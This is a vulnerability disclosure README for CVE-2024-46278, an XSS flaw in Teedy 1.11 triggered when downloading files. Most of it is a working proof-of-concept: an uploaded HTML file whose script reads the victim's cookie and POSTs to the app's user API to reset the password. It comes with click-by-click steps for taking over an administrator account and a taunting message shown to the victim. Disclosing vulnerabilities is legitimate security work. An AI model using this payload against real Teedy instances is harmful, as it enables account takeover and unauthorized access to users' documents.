# teedy_1.11_account-takeover
【Teedy 1.11】account takeover via XSS

# Detail

There is a vulnerability that causes XSS when downloading files. XSS vulnerability could allow a Teedy administrator to rob an account with a few clicks. 

This vulnerability is marked as CVE-2024-46278: https://www.cve.org/CVERecord?id=CVE-2024-46278

# PoC

- Login as an attacker’s account.
- Upload this file as `html` type. You have to change “Origin” and “Referer” and argument for fetch in need.

```javascript
<script>
const currentCookie = document.cookie;

const requestOptions = {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'Accept': 'application/json, text/plain, */*',
    'Cookie': currentCookie,
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
    'sec-ch-ua-platform': '"Linux"',
    'Origin': 'http://localhost:8080',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'http://localhost:8080/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9'
  },
  body: 'password=superSecure2&passwordconfirm=superSecure2'
};

fetch('http://localhost:8080/api/user', requestOptions)
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
        document.write('<h1>Your account was taken over by the attacker LOL</h1>');
    return response.json();
  })
  .then(data => console.log(data))
  .catch(error => console.error('There was a problem with your fetch operation:', error));
</script>
```

- Login with another account. eg. `admin`
- Click on the file uploaded by the attacker and select `Download this file`.

# Demo

https://www.youtube.com/watch?v=udQgVogsmhA
